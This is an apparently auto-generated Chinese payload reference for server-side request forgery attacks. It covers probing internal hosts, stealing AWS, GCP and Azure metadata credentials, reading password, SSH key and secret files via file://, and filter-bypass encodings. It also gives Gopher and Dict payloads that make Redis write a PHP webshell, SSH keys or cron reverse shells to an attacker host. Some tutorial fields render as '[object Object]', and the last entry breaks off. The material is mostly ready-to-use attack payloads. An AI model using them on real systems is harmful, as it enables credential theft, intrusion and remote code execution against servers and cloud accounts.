# SSRF服务端请求伪造 — Web 攻击 payload

> 来源：src-hunter `references/payloader/raw/web.json`（12 条）
> 本文件由 `scripts/build-src-hunter-payloader.mjs` 从结构化 JSON 生成；上游同名 `.md` 为乱码，已弃用。

---
### 1. 基础SSRF攻击

- **id:** `ssrf-basic`
- **分类:** SSRF服务端请求伪造 / 基础攻击
- **tags:** `ssrf` `server-side` `request`

服务端请求伪造基础攻击技术

**前置条件**

- 存在URL输入点
- 服务器会请求用户提供的URL

**利用步骤**

#### 1. 探测SSRF

```
输入URL: http://127.0.0.1
输入URL: http://localhost
输入URL: http://[::1]
观察服务器响应是否包含内网信息
```

探测SSRF漏洞

| 片段 | 说明 | 类型 |
|---|---|---|
| `127.0.0.1` | 本地回环地址 | domain |
| `localhost` | 本地主机名 | domain |
| `[::1]` | IPv6本地地址 | value |

#### 2. 扫描内网端口

```
http://192.168.1.1:22
http://192.168.1.1:80
http://192.168.1.1:443
http://192.168.1.1:3306
根据响应差异判断端口开放状态
```

扫描内网端口

| 片段 | 说明 | 类型 |
|---|---|---|
| `http://192.168.1.1:22 http://192.168.1.1:80 http://192.168.1.1:443 http://192` | 攻击载荷 | value |

#### 3. 访问内网服务

```
http://192.168.1.100/admin
http://10.0.0.1:8080/manager
http://172.16.0.1:9200/_cat/indices
访问内网管理界面或敏感服务
```

访问内网服务

| 片段 | 说明 | 类型 |
|---|---|---|
| `http://192.168.1.100/admin http://10.0.0.1:8080/manager http://172.16.0.1:9200` | 攻击载荷 | value |

#### 4. 读取本地文件

```
file:///etc/passwd
file:///c:/windows/win.ini
file:///proc/self/environ
使用file协议读取本地文件
```

读取本地文件

| 片段 | 说明 | 类型 |
|---|---|---|
| `file://` | 本地文件协议 | value |
| `/etc/passwd` | Linux用户信息文件 | path |

**WAF 绕过**

#### IP格式绕过

```
http://0177.0.0.1 (八进制)
http://2130706433 (十进制)
http://0x7f000001 (十六进制)
http://127.1 (简写)
http://127.0.0.1.nip.io (DNS重绑定)
```

使用不同IP格式绕过

| 片段 | 说明 | 类型 |
|---|---|---|
| `0177` | 127的八进制表示 | value |
| `2130706433` | 127.0.0.1的十进制表示 | value |

#### URL解析差异

```
http://attacker.com#@127.0.0.1/
http://127.0.0.1.attacker.com
http://attacker.com\@127.0.0.1/
利用URL解析差异绕过
```

利用URL解析差异

| 片段 | 说明 | 类型 |
|---|---|---|
| `127.0.0.1` | 本地回环 | domain |

#### DNS重绑定

```
使用DNS重绑定服务:
http://7f000001.cip.cc (解析为127.0.0.1)
http://127.0.0.1.nip.io
第一次解析为外网IP，第二次解析为内网IP
```

DNS重绑定攻击

| 片段 | 说明 | 类型 |
|---|---|---|
| `使用DNS重绑定服务: http://7f000001.cip.cc` | 命令/载荷起始 | command |
| ` (解析为127.0.0.1) http://127.0.0.1.nip.io 第一次解析为外网IP，第二次解析为内网IP` | 参数与载荷内容 | value |

**教程**

[object Object]

---

### 2. AWS元数据攻击

- **id:** `ssrf-cloud-aws`
- **分类:** SSRF服务端请求伪造 / 云元数据
- **tags:** `ssrf` `aws` `metadata` `cloud`

利用SSRF访问AWS EC2元数据服务

**前置条件**

- 存在SSRF漏洞
- 目标运行在AWS EC2上

**利用步骤**

#### 1. 访问元数据服务

```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/user-data/
http://169.254.169.254/latest/dynamic/instance-identity/
```

访问AWS元数据服务

| 片段 | 说明 | 类型 |
|---|---|---|
| `169.254.169.254` | AWS元数据服务地址 | value |
| `latest` | 最新版本的API | value |
| `meta-data` | 实例元数据 | value |

#### 2. 获取IAM凭证

```
http://169.254.169.254/latest/meta-data/iam/security-credentials/
获取角色名后:
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
```

获取IAM临时凭证

| 片段 | 说明 | 类型 |
|---|---|---|
| `iam/security-credentials` | IAM安全凭证路径 | value |

#### 3. 获取用户数据

```
http://169.254.169.254/latest/user-data/
可能包含敏感信息、API密钥、启动脚本
```

获取实例用户数据

| 片段 | 说明 | 类型 |
|---|---|---|
| `http://169.254.169.254/latest/user-data/` | 第1步操作 | command |
| `可能包含敏感信息、API密钥、启动脚本` | 第2步操作 | value |

#### 4. 使用IMDSv2绕过

```
如果IMDSv2被强制:
1. 先获取token:
PUT http://169.254.169.254/latest/api/token
Header: X-aws-ec2-metadata-token-ttl-seconds: 21600
2. 使用token访问:
Header: X-aws-ec2-metadata-token: TOKEN
```

绕过IMDSv2保护

| 片段 | 说明 | 类型 |
|---|---|---|
| `X-aws-ec2-metadata-token` | IMDSv2认证token | value |

**WAF 绕过**

#### IP编码变体绕过

```
# 十进制整数:
http://2852039166/latest/meta-data/
# 十六进制:
http://0xA9FEA9FE/latest/meta-data/
# 八进制:
http://0251.0376.0251.0376/latest/meta-data/
# IPv6映射:
http://[::ffff:169.254.169.254]/latest/meta-data/
# 混合编码:
http://0xA9.0376.169.0xFE/latest/meta-data/
```

通过十进制、十六进制、八进制及IPv6映射等IP地址编码方式绕过169.254.169.254黑名单检测

| 片段 | 说明 | 类型 |
|---|---|---|
| `# 十进制整数:` | 主要命令 | command |
| `...` | 共10行 | value |

#### DNS重绑定与重定向链绕过

```
# DNS重绑定(使用rebind服务):
http://7f000001.A9FEA9FE.rbndr.us/latest/meta-data/
# 第一次解析到允许的IP，第二次解析到169.254.169.254

# 重定向链:
# 在attacker.com设置302跳转到http://169.254.169.254
http://attacker.com/redirect?url=http://169.254.169.254/latest/meta-data/

# URL schema变体:
gopher://169.254.169.254:80/_GET%20/latest/meta-data/%20HTTP/1.1%0AHost:%20169.254.169.254%0A%0A
```

利用DNS重绑定使域名在验证时解析为安全IP而实际请求时解析为元数据地址，或通过HTTP重定向链和非标准协议绕过

| 片段 | 说明 | 类型 |
|---|---|---|
| `# DNS重绑定(使用rebind服务):` | 主要命令 | command |
| `...` | 共8行 | value |

**教程**

[object Object]

---

### 3. GCP元数据攻击

- **id:** `ssrf-cloud-gcp`
- **分类:** SSRF服务端请求伪造 / GCP元数据
- **tags:** `ssrf` `gcp` `cloud` `metadata`

利用SSRF攻击Google Cloud元数据服务

**前置条件**

- 存在SSRF漏洞
- 目标运行在GCP环境

**利用步骤**

#### 1. 访问元数据服务

```
http://metadata.google.internal/computeMetadata/v1/
需要添加Header:
Metadata-Flavor: Google
```

访问GCP元数据端点

| 片段 | 说明 | 类型 |
|---|---|---|
| `metadata.google.internal` | GCP元数据服务地址 | domain |
| `computeMetadata/v1/` | 计算引擎元数据API | encoding |
| `Metadata-Flavor: Google` | 必需的请求头 | header |

#### 2. 获取访问令牌

```
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
返回OAuth访问令牌
```

获取服务账户令牌

| 片段 | 说明 | 类型 |
|---|---|---|
| `http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/def` | 攻击载荷 | value |

#### 3. 获取服务账户信息

```
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/aliases
```

获取服务账户邮箱和别名

| 片段 | 说明 | 类型 |
|---|---|---|
| `http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/def` | 攻击载荷 | value |

#### 4. 获取项目信息

```
http://metadata.google.internal/computeMetadata/v1/project/project-id
http://metadata.google.internal/computeMetadata/v1/project/numeric-project-id
```

获取项目ID

| 片段 | 说明 | 类型 |
|---|---|---|
| `http://metadata.google.internal/computeMetadata/v1/project/project-id http://me` | 攻击载荷 | value |

#### 5. 获取SSH密钥

```
http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys
http://metadata.google.internal/computeMetadata/v1/instance/attributes/ssh-keys
```

获取SSH公钥

| 片段 | 说明 | 类型 |
|---|---|---|
| `http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys ` | 攻击载荷 | value |

#### 6. 获取Kubelet凭据

```
http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env
获取Kubernetes环境变量
```

获取GKE集群信息

| 片段 | 说明 | 类型 |
|---|---|---|
| `http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env` | 命令/关键字 | command |

**WAF 绕过**

#### 使用IP地址

```
http://169.254.169.254/computeMetadata/v1/
使用内网IP代替域名
```

绕过域名过滤

| 片段 | 说明 | 类型 |
|---|---|---|
| `http://169.254.169.254/computeMetadata/v1/ 使用内网IP代替域名` | 攻击载荷 | value |

**教程**

[object Object]

---

### 4. Azure元数据攻击

- **id:** `ssrf-cloud-azure`
- **分类:** SSRF服务端请求伪造 / Azure元数据
- **tags:** `ssrf` `azure` `cloud` `metadata`

利用SSRF攻击Azure元数据服务

**前置条件**

- 存在SSRF漏洞
- 目标运行在Azure环境

**利用步骤**

#### 1. 访问元数据服务

```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
需要添加Header:
Metadata: true
```

访问Azure元数据端点

| 片段 | 说明 | 类型 |
|---|---|---|
| `169.254.169.254` | Azure元数据服务IP | domain |
| `/metadata/instance` | 实例元数据端点 | encoding |
| `Metadata: true` | 必需的请求头 | header |

#### 2. 获取访问令牌

```
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
返回Azure AD访问令牌
```

获取托管身份令牌

| 片段 | 说明 | 类型 |
|---|---|---|
| `http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/ 返回Azure` | 命令/载荷起始 | command |
| ` AD访问令牌` | 参数与载荷内容 | value |

#### 3. 获取计算信息

```
http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01
返回VM详细信息
```

获取计算实例信息

| 片段 | 说明 | 类型 |
|---|---|---|
| `http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01 返回VM详细信` | 攻击载荷 | value |

#### 4. 获取网络信息

```
http://169.254.169.254/metadata/instance/network?api-version=2021-02-01
返回网络配置信息
```

获取网络配置

| 片段 | 说明 | 类型 |
|---|---|---|
| `http://169.254.169.254/metadata/instance/network?api-version=2021-02-01 返回网络配置信` | 攻击载荷 | value |

#### 5. 获取用户数据

```
http://169.254.169.254/metadata/instance/compute/userData?api-version=2021-02-01&format=text
返回用户自定义数据
```

获取用户数据

| 片段 | 说明 | 类型 |
|---|---|---|
| `http://169.254.169.254/metadata/instance/compute/userData?api-version=2021-02-01` | 攻击载荷 | value |

**WAF 绕过**

#### 绕过Metadata头检查

```
使用HTTP请求走私或重定向绕过Metadata头检查
```

绕过请求头验证

| 片段 | 说明 | 类型 |
|---|---|---|
| `使用HTTP请求走私或重定向绕过Metadata头检查` | 攻击载荷 | value |

**教程**

[object Object]

---

### 5. SSRF协议利用

- **id:** `ssrf-protocol`
- **分类:** SSRF服务端请求伪造 / 协议利用
- **tags:** `ssrf` `protocol` `file` `gopher`

利用各种协议进行SSRF攻击

**前置条件**

- 存在SSRF漏洞
- 服务器支持多种协议

**利用步骤**

#### 1. File协议

```
file:///etc/passwd
file:///c:/windows/win.ini
file:///proc/self/environ
读取本地文件
```

使用File协议读取文件

| 片段 | 说明 | 类型 |
|---|---|---|
| `file://` | 本地文件协议 | value |
| `/etc/passwd` | Linux用户信息文件 | path |
| `/proc/self/environ` | 当前进程环境变量 | path |

#### 2. Dict协议

```
dict://127.0.0.1:6379/info
dict://127.0.0.1:11211/stats
探测内网服务
```

使用Dict协议探测服务

| 片段 | 说明 | 类型 |
|---|---|---|
| `dict://` | 字典服务协议 | value |
| `6379` | Redis默认端口 | value |
| `11211` | Memcached默认端口 | value |

#### 3. Gopher协议

```
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a...
构造Redis命令
```

使用Gopher协议攻击内网服务

| 片段 | 说明 | 类型 |
|---|---|---|
| `gopher://` | Gopher协议 | value |
| `_` | 协议分隔符 | value |
| `%0d%0a` | CRLF换行符URL编码 | encoding |

#### 4. LDAP协议

```
ldap://attacker.com/cn=test
ldap://127.0.0.1:389/cn=test
触发LDAP查询
```

使用LDAP协议

| 片段 | 说明 | 类型 |
|---|---|---|
| `ldap://attacker.com/cn=test ldap://127.0.0.1:389/cn=test 触发LDAP查询` | 攻击载荷 | value |

#### 5. TFTP协议

```
tftp://attacker.com/file
触发TFTP请求
```

使用TFTP协议

| 片段 | 说明 | 类型 |
|---|---|---|
| `tftp://attacker.com/file 触发TFTP请求` | 攻击载荷 | value |

**WAF 绕过**

#### 协议大小写绕过

```
FILE:///etc/passwd
File:///etc/passwd
Gopher://127.0.0.1:6379/
```

大小写混合绕过

| 片段 | 说明 | 类型 |
|---|---|---|
| `FILE:///etc/passwd File:///etc/passwd Gopher://127.0.0.1:6379/` | 攻击载荷 | value |

**教程**

[object Object]

---

### 6. Gopher协议攻击

- **id:** `ssrf-gopher`
- **分类:** SSRF服务端请求伪造 / Gopher攻击
- **tags:** `ssrf` `gopher` `redis` `mysql`

利用Gopher协议攻击内网服务

**前置条件**

- 存在SSRF漏洞
- 服务器支持Gopher协议

**利用步骤**

#### 1. Gopher基础格式

```
gopher://<host>:<port>/_<payload>
_后面是实际发送的数据
需要URL编码
```

Gopher协议格式

| 片段 | 说明 | 类型 |
|---|---|---|
| `gopher://` | Gopher协议标识 | value |
| `<host>:<port>` | 目标主机和端口 | tag |
| `_<payload>` | 要发送的数据 | value |

#### 2. 攻击Redis

```
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$28%0d%0a%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/attacker/4444 0>&1%0a%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a
```

写入cron任务反弹Shell

| 片段 | 说明 | 类型 |
|---|---|---|
| `gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a` | 攻击载荷 | value |

#### 3. 攻击MySQL

```
gopher://127.0.0.1:3306/_<MySQL协议数据包>
需要构造MySQL协议格式的数据
```

攻击MySQL数据库

| 片段 | 说明 | 类型 |
|---|---|---|
| `gopher://127.0.0.1:3306/_<MySQL协议数据包> 需要构造MySQL协议格式的数据` | 攻击载荷 | value |

#### 4. 攻击FastCGI

```
gopher://127.0.0.1:9000/_<FastCGI数据包>
构造PHP-FPM攻击载荷
```

攻击PHP-FPM

| 片段 | 说明 | 类型 |
|---|---|---|
| `gopher://127.0.0.1:9000/_<FastCGI数据包> 构造PHP-FPM攻击载荷` | 攻击载荷 | value |

#### 5. 发送HTTP请求

```
gopher://target.com:80/_GET%20/admin%20HTTP/1.1%0d%0aHost:%20target.com%0d%0a%0d%0a
构造HTTP请求攻击内网
```

发送HTTP请求

| 片段 | 说明 | 类型 |
|---|---|---|
| `gopher://target.com:80/_GET%20/admin%20HTTP/1.1%0d%0aHost:%20target.com%0d%0a%0d` | 攻击载荷 | value |

**WAF 绕过**

#### 双重URL编码

```
gopher://127.0.0.1:6379/_%252a%250d%250a...
双重编码绕过
```

双重URL编码绕过

| 片段 | 说明 | 类型 |
|---|---|---|
| `gopher://127.0.0.1:6379/_%252a%250d%250a... 双重编码绕过` | 攻击载荷 | value |

**教程**

[object Object]

---

### 7. Dict协议攻击

- **id:** `ssrf-dict`
- **分类:** SSRF服务端请求伪造 / Dict协议
- **tags:** `ssrf` `dict` `redis` `memcached`

利用Dict协议探测和攻击内网服务

**前置条件**

- 存在SSRF漏洞
- 服务器支持Dict协议

**利用步骤**

#### 1. Dict协议格式

```
dict://<host>:<port>/<command>
发送命令到目标服务
```

Dict协议基础格式

| 片段 | 说明 | 类型 |
|---|---|---|
| `dict://` | Dict协议标识 | value |
| `<host>:<port>` | 目标主机和端口 | tag |
| `<command>` | 要执行的命令 | tag |

#### 2. 探测Redis

```
dict://127.0.0.1:6379/info
dict://127.0.0.1:6379/keys%20*
获取Redis信息
```

探测Redis服务

| 片段 | 说明 | 类型 |
|---|---|---|
| `dict://127.0.0.1:6379/info dict://127.0.0.1:6379/keys%20* 获取Redis信息` | 攻击载荷 | value |

#### 3. 探测Memcached

```
dict://127.0.0.1:11211/stats
dict://127.0.0.1:11211/get%20key
获取Memcached信息
```

探测Memcached服务

| 片段 | 说明 | 类型 |
|---|---|---|
| `dict://127.0.0.1:11211/stats dict://127.0.0.1:11211/get%20key 获取Memcached信息` | 攻击载荷 | value |

#### 4. Redis写入文件

```
dict://127.0.0.1:6379/set%20shell%20"<?php @eval($_POST[cmd]);?>"
dict://127.0.0.1:6379/config%20set%20dir%20/var/www/html
dict://127.0.0.1:6379/config%20set%20dbfilename%20shell.php
dict://127.0.0.1:6379/save
```

写入WebShell

| 片段 | 说明 | 类型 |
|---|---|---|
| `dict://127.0.0.1:6379/set%20shell%20"<?php` | 命令/载荷起始 | command |
| ` @eval($_POST[cmd]);?>" dict://127.0.0.1:6379/config%20set%20dir%20/var/www/html dict://127.0.0.1:6379/config%20set%20dbfilename%20shell.php dict://127.0.0.1:6379/save` | 参数与载荷内容 | value |

**WAF 绕过**

#### 编码绕过

```
dict://127.0.0.1:6379/%73%65%74%20...
URL编码命令
```

URL编码绕过关键字过滤

| 片段 | 说明 | 类型 |
|---|---|---|
| `dict://127.0.0.1:6379/%73%65%74%20... URL编码命令` | 攻击载荷 | value |

**教程**

[object Object]

---

### 8. File协议攻击

- **id:** `ssrf-file`
- **分类:** SSRF服务端请求伪造 / File协议
- **tags:** `ssrf` `file` `lfi` `read`

利用File协议读取本地文件

**前置条件**

- 存在SSRF漏洞
- 服务器支持File协议

**利用步骤**

#### 1. Linux敏感文件

```
file:///etc/passwd
file:///etc/shadow
file:///etc/hosts
file:///etc/resolv.conf
file:///proc/self/environ
file:///proc/self/cmdline
```

读取Linux敏感文件

| 片段 | 说明 | 类型 |
|---|---|---|
| `file://` | File协议标识 | value |
| `/etc/passwd` | 用户信息文件 | path |
| `/proc/self/` | 当前进程信息目录 | path |

> platform: `linux`

#### 2. Windows敏感文件

```
file:///c:/windows/win.ini
file:///c:/windows/system32/config/sam
file:///c:/users/administrator/.ssh/id_rsa
file:///c:/inetpub/logs/logfiles/
```

读取Windows敏感文件

| 片段 | 说明 | 类型 |
|---|---|---|
| `file:///c:/windows/win.ini file:///c:/windows/system32/config/sam file:///c:/u` | 攻击载荷 | value |

> platform: `windows`

#### 3. Web配置文件

```
file:///var/www/html/config.php
file:///var/www/html/wp-config.php
file:///app/config/database.yml
file:///app/.env
```

读取Web应用配置

| 片段 | 说明 | 类型 |
|---|---|---|
| `file:///var/www/html/config.php file:///var/www/html/wp-config.php file:///app` | 攻击载荷 | value |

#### 4. 云环境文件

```
file:///var/run/secrets/kubernetes.io/serviceaccount/token
file:///var/run/secrets/kubernetes.io/serviceaccount/ca.crt
file:///home/user/.aws/credentials
```

读取云环境凭据

| 片段 | 说明 | 类型 |
|---|---|---|
| `file:///var/run/secrets/kubernetes.io/serviceaccount/token file:///var/run/secr` | 攻击载荷 | value |

#### 5. SSH密钥

```
file:///home/user/.ssh/id_rsa
file:///home/user/.ssh/authorized_keys
file:///root/.ssh/id_rsa
```

读取SSH私钥

| 片段 | 说明 | 类型 |
|---|---|---|
| `file:///home/user/.ssh/id_rsa file:///home/user/.ssh/authorized_keys file:///r` | 攻击载荷 | value |

**WAF 绕过**

#### 大小写混合

```
FILE:///etc/passwd
File:///etc/passwd
file:///ETC/PASSWD
```

大小写混合绕过

| 片段 | 说明 | 类型 |
|---|---|---|
| `FILE:///etc/passwd File:///etc/passwd file:///ETC/PASSWD` | 攻击载荷 | value |

**教程**

[object Object]

---

### 9. SSRF绕过技术

- **id:** `ssrf-bypass`
- **分类:** SSRF服务端请求伪造 / 绕过技术
- **tags:** `ssrf` `bypass` `waf` `filter`

各种绕过SSRF过滤的技术

**前置条件**

- 存在SSRF漏洞
- 存在过滤机制

**利用步骤**

#### 1. IP格式绕过

```
http://0177.0.0.1 (八进制)
http://2130706433 (十进制)
http://0x7f000001 (十六进制)
http://127.1 (简写)
http://127.0.0.1.nip.io (DNS重绑定)
http://127.0.0.1.xip.io
```

使用不同IP格式表示127.0.0.1

| 片段 | 说明 | 类型 |
|---|---|---|
| `0177` | 127的八进制表示 | value |
| `2130706433` | 127.0.0.1的十进制整数 | value |
| `0x7f000001` | 127.0.0.1的十六进制 | encoding |

#### 2. URL解析差异

```
http://attacker.com#@127.0.0.1/
http://127.0.0.1.attacker.com
http://attacker.com\@127.0.0.1/
http://attacker.com\.127.0.0.1/
```

利用URL解析差异

| 片段 | 说明 | 类型 |
|---|---|---|
| `#@` | 利用片段标识符差异 | value |
| `\@` | 利用反斜杠解析差异 | value |

#### 3. 重定向绕过

```
http://attacker.com/redirect?url=http://127.0.0.1
使用短链接服务重定向到内网
```

利用HTTP重定向

| 片段 | 说明 | 类型 |
|---|---|---|
| `http://attacker.com/redirect?url=http://127.0.0.1 使用短链接服务重定向到内网` | 攻击载荷 | value |

#### 4. DNS重绑定

```
http://7f000001.cip.cc
http://127.0.0.1.nip.io
第一次解析为外网IP，第二次解析为内网IP
```

DNS重绑定攻击

| 片段 | 说明 | 类型 |
|---|---|---|
| `http://7f000001.cip.cc http://127.0.0.1.nip.io 第一次解析为外网IP，第二次解析为内网IP` | 攻击载荷 | value |

#### 5. IPv6绕过

```
http://[::1]
http://[0:0:0:0:0:0:0:1]
http://[0000::1]
使用IPv6本地地址
```

使用IPv6地址绕过

| 片段 | 说明 | 类型 |
|---|---|---|
| `http://[::1] http://[0:0:0:0:0:0:0:1] http://[0000::1] 使用IPv6本地地址` | 攻击载荷 | value |

#### 6. 编码绕过

```
http://%31%32%37%2e%30%2e%30%2e%31 (URL编码)
http://127.0.0.1%00attacker.com (空字节)
http://127.0.0.1%0d%0aHost:attacker.com (CRLF)
```

使用编码绕过

| 片段 | 说明 | 类型 |
|---|---|---|
| `http://%31%32%37%2e%30%2e%30%2e%31` | 命令/载荷起始 | command |
| ` (URL编码) http://127.0.0.1%00attacker.com (空字节) http://127.0.0.1%0d%0aHost:attacker.com (CRLF)` | 参数与载荷内容 | value |

**WAF 绕过**

#### 组合绕过

```
http://0x7f.0.0.1
http://0177.0.0.1
http://127.000.000.001
多种格式组合
```

组合多种绕过技术

| 片段 | 说明 | 类型 |
|---|---|---|
| `http://0x7f.0.0.1 http://0177.0.0.1 http://127.000.000.001 多种格式组合` | 攻击载荷 | value |

**教程**

[object Object]

---

### 10. DNS重绑定攻击

- **id:** `ssrf-dns-rebinding`
- **分类:** SSRF服务端请求伪造 / DNS重绑定
- **tags:** `ssrf` `dns` `rebinding` `bypass`

利用DNS重绑定绕过SSRF防护

**前置条件**

- 存在SSRF漏洞
- 存在DNS解析验证

**利用步骤**

#### 1. DNS重绑定原理

```
第一次DNS查询：返回外网IP（通过验证）
第二次DNS查询：返回内网IP（实际访问）
利用TTL=0或短TTL
```

DNS重绑定原理

| 片段 | 说明 | 类型 |
|---|---|---|
| `TTL=0` | DNS记录立即过期 | value |
| `第一次查询` | 返回允许的IP | value |
| `第二次查询` | 返回内网IP | value |

#### 2. 使用公开服务

```
http://7f000001.cip.cc (解析为127.0.0.1)
http://127.0.0.1.nip.io
http://127.0.0.1.xip.io
http://A.127.0.0.1.1time.8.8.8.8.forever.rebind.network
```

使用DNS重绑定服务

| 片段 | 说明 | 类型 |
|---|---|---|
| `http://7f000001.cip.cc` | 命令/载荷起始 | command |
| ` (解析为127.0.0.1) http://127.0.0.1.nip.io http://127.0.0.1.xip.io http://A.127.0.0.1.1time.8.8.8.8.forever.rebind.network` | 参数与载荷内容 | value |

#### 3. 自建DNS服务器

```
# 使用dnspython搭建
from dnslib import *
class RebindResolver:
    def __init__(self):
        self.count = 0
    def resolve(self, request):
        self.count += 1
        if self.count % 2 == 1:
            return "1.2.3.4"  # 外网IP
        else:
            return "127.0.0.1"  # 内网IP
```

自建DNS重绑定服务器

| 片段 | 说明 | 类型 |
|---|---|---|
| `# 使用dnspython搭建 from dnslib import * class RebindResolver:     def __init__(s` | 攻击载荷 | value |

#### 4. 攻击流程

```
1. 注册域名指向自建DNS服务器
2. 配置DNS服务器返回两个IP
3. 使用该域名发起SSRF请求
4. 第一次验证通过，第二次访问内网
```

完整攻击流程

| 片段 | 说明 | 类型 |
|---|---|---|
| `1.` | 命令/载荷起始 | command |
| ` 注册域名指向自建DNS服务器 2. 配置DNS服务器返回两个IP 3. 使用该域名发起SSRF请求 4. 第一次验证通过，第二次访问内网` | 参数与载荷内容 | value |

**WAF 绕过**

#### 多IP响应

```
DNS响应包含多个A记录
服务器可能选择不同的IP
```

利用多IP响应

| 片段 | 说明 | 类型 |
|---|---|---|
| `DNS响应包含多个A记录 服务器可能选择不同的IP` | 攻击载荷 | value |

**教程**

[object Object]

---

### 11. SSRF攻击Redis

- **id:** `ssrf-redis`
- **分类:** SSRF服务端请求伪造 / Redis攻击
- **tags:** `ssrf` `redis` `rce` `webshell`

利用SSRF攻击内网Redis服务

**前置条件**

- 存在SSRF漏洞
- 内网存在未授权Redis

**利用步骤**

#### 1. 探测Redis

```
dict://127.0.0.1:6379/info
或使用Gopher:
gopher://127.0.0.1:6379/_INFO
```

探测Redis服务

| 片段 | 说明 | 类型 |
|---|---|---|
| `dict://127.0.0.1:6379/info 或使用Gopher: gopher://127.0.0.1:6379/_INFO` | 攻击载荷 | value |

#### 2. 写入WebShell

```
# 使用Dict协议
dict://127.0.0.1:6379/set%20shell%20"<?php @eval($_POST[cmd]);?>"
dict://127.0.0.1:6379/config%20set%20dir%20/var/www/html
dict://127.0.0.1:6379/config%20set%20dbfilename%20shell.php
dict://127.0.0.1:6379/save
```

写入WebShell到Web目录

| 片段 | 说明 | 类型 |
|---|---|---|
| `set shell` | 设置键值 | value |
| `config set dir` | 设置保存目录 | value |
| `config set dbfilename` | 设置保存文件名 | value |
| `save` | 保存数据库到文件 | value |

#### 3. 写入SSH公钥

```
dict://127.0.0.1:6379/set%20ssh%20"ssh-rsa AAAA..."
dict://127.0.0.1:6379/config%20set%20dir%20/root/.ssh
dict://127.0.0.1:6379/config%20set%20dbfilename%20authorized_keys
dict://127.0.0.1:6379/save
```

写入SSH公钥

| 片段 | 说明 | 类型 |
|---|---|---|
| `dict://127.0.0.1:6379/set%20ssh%20"ssh-rsa` | 命令/载荷起始 | command |
| ` AAAA..." dict://127.0.0.1:6379/config%20set%20dir%20/root/.ssh dict://127.0.0.1:6379/config%20set%20dbfilename%20authorized_keys dict://127.0.0.1:6379/save` | 参数与载荷内容 | value |

#### 4. 写入Cron任务

```
dict://127.0.0.1:6379/set%20cron%20"*/1 * * * * bash -i >& /dev/tcp/attacker/4444 0>&1"
dict://127.0.0.1:6379/config%20set%20dir%20/var/spool/cron
dict://127.0.0.1:6379/config%20set%20dbfilename%20root
dict://127.0.0.1:6379/save
```

写入Cron反弹Shell

| 片段 | 说明 | 类型 |
|---|---|---|
| `dict://127.0.0.1:6379/set%20cron%20"*/1 * * * * bash -i >& /dev/tcp/attacker/444` | 攻击载荷 | value |

> platform: `linux`

#### 5. 主从复制RCE

```
# 使用redis-rogue-server
python redis-rogue-server.py --rhost=127.0.0.1 --lhost=attacker.com
利用Redis主从复制加载恶意模块
```

主从复制RCE

| 片段 | 说明 | 类型 |
|---|---|---|
| `#` | 命令/载荷起始 | command |
| ` 使用redis-rogue-server python redis-rogue-server.py --rhost=127.0.0.1 --lhost=attacker.com 利用Redis主从复制加载恶意模块` | 参数与载荷内容 | value |

**WAF 绕过**

#### Gopher协议构造

```
使用Gopher协议构造完整的Redis命令序列
可以绕过Dict协议限制
```

使用Gopher协议

| 片段 | 说明 | 类型 |
|---|---|---|
| `使用Gopher协议构造完整的Redis命令序列 可以绕过Dict协议限制` | 攻击载荷 | value |

**教程**

[object Object]

---

### 12. SSRF攻击MySQL

- **id:** `ssrf-mysql`
- **分类:** SSRF服务端请求伪造 / MySQL攻击
- **tags:** `ssrf` `mysql` `gopher` `database`

利用SSRF攻击内网MySQL服务

**前置条件**

- 存在SSRF漏洞
- 内网存在MySQL服务
- 知道MySQL用户名

**利用步骤**

#### 1. MySQL协议基础

```
MySQL通信协议:
- 握手包
- 认证包
- 命令包
需要构造符合协议的数据
```

MySQL协议基础

| 片段 | 说明 | 类型 |
|---|---|---|
| `MySQL通信协议` | MySQL使用自定义二进制协议通信，基于TCP | command |
| `握手包` | 服务端发送的初始包，包含协议版本、服务器版本、随机挑战数 | parameter |
| `认证包` | 客户端发送的认证信息，包含用户名和加密密码 | parameter |
| `命令包` | 认证后发送的SQL命令包，类型为COM_QUERY(0x03) | value |

#### 2. 使用Gopher攻击MySQL

```
# 构造MySQL协议数据包
# 需要使用工具生成
gopher://127.0.0.1:3306/_[MySQL Protocol Data]

# 使用sqlmap
gopher://127.0.0.1:3306/_[sqlmap生成的payload]
```

Gopher协议攻击MySQL

| 片段 | 说明 | 类型 |
|---|---|---|
| `gopher://` | Gopher协议前缀，允许发送原始TCP数据 | command |
| `127.0.0.1:3306` | 目标MySQL服务地址和端口（默认3306） | value |
| `/_` | Gopher数据分隔符，_后为实际发送的数据 | operator |
| `[MySQL Protocol Data]` | URL编码的MySQL协议二进制数据包 | variable |

#### 3. 使用工具生成Payload

```
# 使用Gopherus工具
python gopherus.py --exploit mysql
输入用户名和SQL命令
生成Gopher URL

# 或使用mysql_gopher_attack工具
```

使用工具生成Payload

| 片段 | 说明 | 类型 |
|---|---|---|
